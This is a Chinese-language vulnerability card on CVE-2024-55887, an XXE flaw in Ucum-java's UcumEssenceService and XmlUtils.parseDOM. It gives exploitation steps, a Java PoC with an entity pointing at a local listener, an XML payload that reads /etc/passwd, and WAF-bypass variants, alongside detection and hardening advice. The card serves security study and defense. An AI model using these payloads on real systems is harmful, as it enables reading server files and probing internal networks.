---
id: web-java-component-ucum-xmlutils-documentbuilderfactory-xxe
title: Ucum-java 的 DTD 未禁用导致 XXE：UcumEssenceService 构造参数与 XmlUtils.parseDOM 直接把外部 XML 流交给未配置的 DocumentBuilderFactory，可带内回显或打内网 HTTP
type: scenario
domain: web
path: web/generic/xxe
technique: java-documentbuilderfactory-default-xxe-ucum
aliases:
- CVE-2024-55887
- UcumEssenceService XXE
- XmlUtils.parseDOM XXE
- DocumentBuilderFactory 未禁用 DTD
- javax.xml XXE
tags:
- xxe
- java
- xml
- dtd
- file-read
- ssrf
- component
- cve-2024-55887
cve:
- CVE-2024-55887
severity: medium
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: < 1.0.9（原文：官方在 1.09 修复）
verification:
  verified_by: verifier-T2-3W4B
  verified_at: '2026-11-08T21:47:50+08:00'
  notes: 已对照原文核对；本次核对未读取图片（4 张图均为 Burp/pom 截图）；原文未给出带内回显 PoC，卡片已按盲 XXE 与带内 XXE 区分；affected_versions 与 CVE-2024-55887 均取自原文；未在本机复现
---

## 一句话结论

Ucum-java 的解析入口 `UcumEssenceService(InputStream)` 与 `XmlUtils.parseDOM(InputStream)` 都直接用默认 `DocumentBuilderFactory` 去 `parse(stream)`，没有关闭 DTD/外部实体；只要业务把攻击者可控的 XML 交给这两个入口，就能用 `<!DOCTYPE ... <!ENTITY x SYSTEM "file:///..." 或 "http://内网/">` 做带内文件读取或内网 HTTP 探测。

## 原理

- `DocumentBuilderFactory.newInstance()` 的默认配置在 JDK 上是 **DTD 与外部实体都允许**：`setNamespaceAware(false)` 只影响命名空间，不改变实体解析行为。要安全必须显式 `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` 或 `setExpandEntityReferences(false)` + `setFeature(".../external-general-entities", false)` + `setXIncludeAware(false)`。
- `UcumEssenceService` 构造函数把入参 `stream` 一路交给 `DefinitionsProviderFactory.getProvider().parse(stream)`，中间没有做任何 XML 白名单或格式校验，因此实体的解析发生在服务端，攻击者控制的是"文档内容"而非"是否解析"。
- 实体值会替换到解析树的文本节点里：若业务把解析结果（如 `<author>` 文本）回显到响应/日志/异常信息，就是带内 XXE；若走 `SYSTEM "http"` 则变成服务端发起的出网请求（SSRF/盲外带）。
- 该漏洞的修复点落在 `XmlUtils`：说明同一个项目里"读 XML"的地方不止一处，审计时应把所有 `DocumentBuilderFactory`、`SAXParserFactory`、`SAXReader`、`XMLInputFactory` 站点一起看，而不是只堵通告点名的那一个类。

## 触发条件

- 应用使用 Ucum-java < 1.0.9，且能把用户可控的 XML（上传文件、接口 body、配置导入、URL 抓取内容）传给 `UcumEssenceService` 或 `XmlUtils.parseDOM`。
- 目标 JDK 未通过 `jdk.xml.entityExpansionLimit` 等全局属性额外收紧；出网策略未阻断内网/回环。
- 带内读取需要解析结果被回显（响应、错误信息、日志可见）；否则走 OOB/盲 XXE。

## 利用步骤

1. 找 XML 入库点：计量单位定义导入、XML 配置文件上传、`Content-Type: application/xml` 的接口。
2. 先发一个只有 `<!DOCTYPE test [<!ENTITY x "abc">]>` 的文档确认 DTD 被解析（回显或报错差异）。
3. 换成 `SYSTEM "file:///etc/passwd"` 做带内读；读不到就换 `http://127.0.0.1:PORT/xxe`，在本地起 listener 观察是否收到请求（盲 XXE 确认）。
4. 需要外带数据时改成参数实体 + 外部 DTD（见通用 XXE 外带卡），或把文件内容拼进 URL 路径。

## PoC

```java
String xml = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
    + "<!DOCTYPE test [\n"
    + "  <!ENTITY file SYSTEM \"http://127.0.0.1:8000/xxe\">\n"
    + "]>\n"
    + "<author>&file;</author>";
new UcumEssenceService(new ByteArrayInputStream(xml.getBytes()));
// 等价：XmlUtils.parseDOM(new ByteArrayInputStream(xml.getBytes()));
```

```xml
<!-- 带内读文件：把 author 的文本回显到响应 -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [<!ENTITY f SYSTEM "file:///etc/passwd">]>
<author>&f;</author>
```

## 变体与关联

- 同类 sink：`SAXParser.parse`、`XMLReader`、`DocumentBuilder.parse`、`TransformerFactory.newTransformer().transform`（XSLT 读文件）、`XMLInputFactory`（StAX）。
- 变体：UTF-16/UTF-16BE 编码绕过只筛 `<?xml` 的 WAF；`data:` URI 承载外部 DTD 绕外链黑名单；把实体放进属性值而非文本节点。
- 组件面：只要解析器属于"库自带、默认配置"，通告通常只修其中一处，其他入口仍在。

## 检测与防御

- 代码侧：所有 XML 工厂统一走安全模板，禁用 doctype、禁用外部通用/参数实体、关闭 XInclude 与实体扩展；优先用 `SAXReader` 的 `setFeature(disallow-doctype-decl, true)`。
- 运行侧：升级 Ucum-java ≥ 1.0.9；对 XML 入参做大小与结构限制；解析服务降权运行并限制出网（回环、内网、元数据地址全禁），可显著降低盲 XXE 收益。
- 检测：请求体含 `<!DOCTYPE`/`<!ENTITY`/`SYSTEM`；应用进程异常发起内网 HTTP 或读取敏感路径；解析异常栈里出现 `SAXParseException` 且带外部 URI。
